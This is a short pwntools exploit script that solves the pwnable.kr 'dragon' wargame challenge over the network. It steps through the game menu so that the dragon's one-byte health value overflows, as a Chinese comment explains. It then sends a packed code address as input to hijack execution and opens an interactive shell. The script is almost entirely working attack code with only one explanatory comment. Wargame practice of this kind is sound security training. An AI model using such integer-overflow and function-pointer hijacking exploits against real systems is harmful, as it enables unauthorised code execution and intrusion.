from pwn import *

context.log_level = 'DEBUG'
context.binary = ELF('./dragon')

# p = process('./dragon')
p = remote('pwnable.kr', '9004')

p.sendlineafter(b'Knight\n', b'1')
p.sendlineafter(b'Invincible.\n', b'1')
p.sendlineafter(b'Invincible.\n', b'1')

p.sendlineafter(b'Knight\n', b'1')

# 初始生命值80，每一轮加12，超过127就溢出变成负数
for i in range(4):
    p.sendlineafter(b'Invincible.\n', b'3')
    p.sendlineafter(b'Invincible.\n', b'3')
    p.sendlineafter(b'Invincible.\n', b'2')
p.sendlineafter(b'As:\n', p32(0x08048dbf))

p.interactive()

